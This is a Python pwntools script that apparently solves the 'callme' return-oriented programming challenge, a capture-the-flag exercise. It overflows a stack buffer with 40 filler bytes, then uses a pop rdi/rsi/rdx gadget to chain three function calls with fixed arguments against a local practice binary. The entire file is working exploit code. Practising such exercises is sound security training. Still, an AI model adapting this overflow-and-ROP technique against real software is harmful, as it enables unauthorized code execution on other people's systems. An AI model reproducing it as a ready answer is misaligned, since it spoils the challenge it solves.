#!/usr/bin/env python3
from pwn import *

io = process("./callme")

# usefulGadgets address
#   pop rdi; pop rsi; pop rdx; ret
rop_gadgets = p64(0x40093c)         

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)

# Fill 32B buffer and rbp
payload = b"A" * 40              

# Load arguments for callme_one
payload += rop_gadgets
payload += p64(0xdeadbeefdeadbeef) 
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

# Call callme_one
payload += callme_one

# Load arguments for callme_two
payload += rop_gadgets
payload += p64(0xdeadbeefdeadbeef) 
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

# Call callme_two
payload += callme_two

# Load arguments for callme_three
payload += rop_gadgets
payload += p64(0xdeadbeefdeadbeef) 
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

# Call callme_three
payload += callme_three

# Send payload and print results
io.sendline(payload)
print(io.clean().decode())
